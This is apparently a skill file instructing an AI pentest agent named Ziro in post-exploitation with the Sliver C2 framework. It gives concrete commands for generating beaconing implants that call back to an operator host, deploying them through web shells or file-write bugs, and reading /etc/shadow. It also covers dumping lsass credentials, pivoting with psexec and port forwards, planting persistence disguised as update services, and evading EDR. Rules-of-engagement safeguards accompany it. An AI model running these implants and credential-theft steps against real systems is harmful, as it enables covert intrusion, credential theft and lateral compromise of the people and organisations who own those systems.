---
name: sliver_c2
description: Sliver C2 post-exploitation — implant generation, listener management, session handling, lateral movement via mTLS/HTTPS/DNS channels
mitre_techniques: [T1071.001, T1572, T1095, T1572.001, T1105, T1219, T1021]
kill_chain_phases: [command_and_control, lateral_movement, execution, exfiltration]
related_skills: [metasploit, pivoting, credential_access, evil_winrm]
---

# Sliver C2

Sliver is an open-source cross-platform adversary emulation / red team framework from BishopFox. Built in Go, Sliver emphasizes stealth, mTLS security, and flexible C2 protocols. It's Ziro's default C2 for post-exploitation workflows after an initial foothold.

## When to Use Sliver

- You have an RCE/command execution primitive on a Linux, Windows, or macOS target and need **persistent post-exploitation access**
- The client's red team engagement requires **real adversary emulation** with beacons, jitter, and realistic dwell time
- You need **multi-protocol C2** (mTLS, HTTPS, DNS, WireGuard) to test defensive detection capabilities
- Post-exploit workflow: **lateral movement, credential dumping, privilege escalation, data staging** on the compromised host
- You want **in-memory tool execution** via execute-assembly (Windows) without touching disk

**Do not use Sliver for**: initial exploitation (use the actual exploit first), simple one-off command execution (use terminal_execute or sqlmap), or any target not covered by the written Rules of Engagement.

## Architecture

```
┌────────────────┐            ┌──────────────────────┐            ┌──────────────────┐
│ Ziro sandbox   │            │ Sliver team server    │            │ Compromised host │
│  sliver-client │──mTLS:8888─│  (containers/sliver-  │──HTTPS/DNS─│  implant binary  │
│  (in container)│            │   compose.yml)         │            │                  │
└────────────────┘            └──────────────────────┘            └──────────────────┘
```

- **Team server**: central process that manages operators, implants, sessions. Runs in its own Docker container via `containers/sliver-compose.yml`.
- **sliver-client**: operator console. Runs inside the Ziro sandbox container, connects to the team server over mTLS, talks to Ziro's agent via the tmux_interactive persistent session wrapper.
- **Implant**: Go binary deployed on the target. Calls back to the team server over the configured C2 channel.

## Deployment (Ops Setup)

One-time server setup on the Ziro host:

```bash
docker compose -f containers/sliver-compose.yml up -d

# Generate an operator config
docker exec ziro-sliver /opt/sliver-server operator \
  --name ziro --lhost localhost --save /root/ziro.cfg

# Copy config out of the container
docker cp ziro-sliver:/root/ziro.cfg ./sliver-operator.cfg

# Configure Ziro to use it
export ZIRO_SLIVER_SERVER_URL=localhost:31337
export ZIRO_SLIVER_OPERATOR_CFG=$(pwd)/sliver-operator.cfg

# Restart the panel so the sandbox picks up the env vars
pkill -f "ziro --panel"
poetry run ziro --panel
```

## Tool Workflow (Agent Side)

The agent uses six high-level wrappers (`sliver_connect`, `sliver_command`, `start_listener`, `generate_implant`, `list_sessions_and_beacons`, `interact_with_session`) which internally drive a persistent tmux session running `sliver-client`.

Typical post-exploit chain:

```
1. sliver_connect()
   → Opens the sliver-client console in a persistent tmux session

2. start_listener(protocol="https", port=8443)
   → "Started HTTPS listener"

3. generate_implant(
     name="orion",
     target_os="linux",
     target_arch="amd64",
     protocol="https",
     callback_host="<c2_host>",
     callback_port=8443,
     format_type="exe",
     beacon=True,
     beacon_interval_seconds=120,
     beacon_jitter_seconds=60
   )
   → { saved_path: "/workspace/implants/orion" }

4. Upload /workspace/implants/orion to the target via the existing
   RCE primitive (file upload vuln, sqlmap --file-write, web shell,
   LFI + PHP wrapper, etc.) and execute it.

5. list_sessions_and_beacons()
   → Shows the beacon checking in every ~2 minutes

6. interact_with_session(session_id="1", command="whoami && id")
7. interact_with_session(session_id="1", command="cat /etc/shadow")
8. interact_with_session(session_id="1", command="ps auxf | head -40")

9. sliver_command("portfwd add --remote 10.0.0.5:445 --bind 127.0.0.1:4455")
10. Use local smbclient / impacket tools against 127.0.0.1:4455 to pivot
```

## Protocol Selection

| Protocol | Port | Use case | Tradeoffs |
|---|---|---|---|
| mtls | 8888 | Operator ↔ server only, most secure | Not for implant C2 |
| https | 8443 | Default implant C2, blends with normal traffic | Detected by TLS fingerprinting (JA3, JARM) if not reshaped |
| http | 8080 | Testing / initial PoC | Plaintext — never in production |
| dns | 53 | Stealth, beats egress filters | Very slow (bytes/sec), requires a domain you control |
| wg | 53 UDP | WireGuard tunnel, stealthy | Requires WireGuard on both ends |

For adversary emulation of APT29 (stealth-focused), use **beacon mode over HTTPS with high jitter (>50%)** and domain fronting if available. For APT28 (aggressive), **interactive sessions over mTLS** are fine.

## Session vs Beacon

- **Session**: persistent connection, real-time commands, interactive shell capability. Higher detectability due to constant network traffic. Use for hands-on lateral movement where you need immediate feedback.
- **Beacon**: asynchronous — implant wakes, checks in, downloads queued commands, executes, uploads output, sleeps again. Lower detectability because the network profile looks like periodic DNS/HTTPS requests. Use for long dwell time or when the blue team monitors for sustained connections.

## Key Implant Commands

Once you're in a session via `interact_with_session`:

**Discovery**
- `whoami`, `getuid` — current user identity
- `info` — implant details, PID, checksum
- `pwd`, `ls`, `ls -la /etc` — filesystem
- `env`, `getenv` — environment variables
- `ps`, `ps -T` — process list
- `netstat`, `ifconfig`, `ipconfig` — network
- `env` on Windows → `set`

**File operations**
- `download /etc/shadow ./loot/shadow_target1` — pull files back
- `upload local_file /tmp/implant` — push files to target
- `cat /etc/passwd`, `head`, `tail` — read files
- `rm`, `mv` — delete/rename (destructive — check RoE first)

**Execution**
- `shell` — interactive shell (noisy, prefer discrete commands)
- `execute "command with args"` — one-off command
- `execute-assembly /path/to/SharpHound.exe` (Windows) — in-memory .NET
- `execute-shellcode /path/to/shellcode.bin` — raw shellcode injection
- `sideload /path/to/lib.dll` — load a DLL
- `spawndll pid /path/to/dll` — reflective injection

**Lateral movement**
- `portfwd add --remote <internal_ip>:<port> --bind 127.0.0.1:<local_port>` — forward internal service to operator side
- `portfwd rm --id <id>` — remove forward
- `socks5 start` — start SOCKS5 proxy on operator side, tunnel through implant
- `psexec --hostname <target> --user <user> --password <pw>` — lateral movement via SMB+services (Windows)
- `wmi --hostname <target> --command <cmd>` (Windows)

**Credentials**
- `procdump -n lsass.exe -s /tmp/lsass.dmp` (Windows)
- `registry read HKLM\SAM\SAM\Domains\Account\Users\<RID>` (Windows)
- `cat /etc/shadow` (Linux with root)
- `getsystem` (Windows, token manipulation)

**Persistence**
- `persistence systemd /etc/systemd/system/update-check.service` (Linux)
- `persistence crontab "* */6 * * *"` (Linux)
- `persistence registry "HKCU\...\Run" UpdateCheck` (Windows)

**Cleanup before exit** (engagement end)
- `persistence remove --all` — remove all persistence mechanisms
- `rm` all uploaded files
- `kill` the implant process

## Evasion Notes

Sliver implants are not inherently evasive — defenders with modern EDR will catch default builds. Techniques for adversary emulation:

- **Obfuscation**: use `--obfuscate` flag on generate, or compile via garble
- **Canary-less builds**: disable URL/domain canaries with `--canaries ""`
- **Unique hash per engagement**: use a unique `--name` to ensure build-to-build hash differences
- **Shellcode format**: deploy via custom loader rather than raw exe to bypass signature detection
- **AMSI/ETW bypass**: required on modern Windows; use execute-assembly with pre-patched loaders

Note: Sliver's source is public, so defenders train on its signatures. For realistic red team against mature blue teams, consider custom loaders or shellcode launchers rather than raw implants.

## Safety Rules for Ziro

- **NEVER** deploy an implant to a target not in the written Rules of Engagement (see `create_roe`)
- **NEVER** deploy persistence mechanisms without explicit authorization in the RoE
- **NEVER** use `persistence`, `registry`, `psexec`, `procdump` on production systems without explicit written approval
- **ALWAYS** tag implants with the engagement slug in their name (e.g., `--name acme_q2_audit_001`)
- **ALWAYS** clean up all implants and persistence at end of engagement via the rollback section of the OPPLAN
- **ALWAYS** document every session, every file read, every lateral movement in the audit log for handover

## Troubleshooting

- **"Sliver C2 not configured"** — `ZIRO_SLIVER_SERVER_URL` and `ZIRO_SLIVER_OPERATOR_CFG` must be set before starting the panel. The sandbox reads them from the panel's environment.
- **"Session dead"** — the sliver-client process inside the sandbox crashed. Call `sliver_connect` again; it will start a fresh session.
- **Implant won't check in** — verify the listener is actually running (`list_sessions_and_beacons`), the callback_host is reachable from the target, and no firewall is blocking the port.
- **"Failed to start session"** — likely the operator config is wrong or the team server isn't running. Check `docker ps --filter name=ziro-sliver`.

## References

- Sliver official docs: https://sliver.sh/
- Sliver GitHub: https://github.com/BishopFox/sliver
- MITRE ATT&CK T1071.001 — Web Protocols C2
- MITRE ATT&CK T1572 — Protocol Tunneling
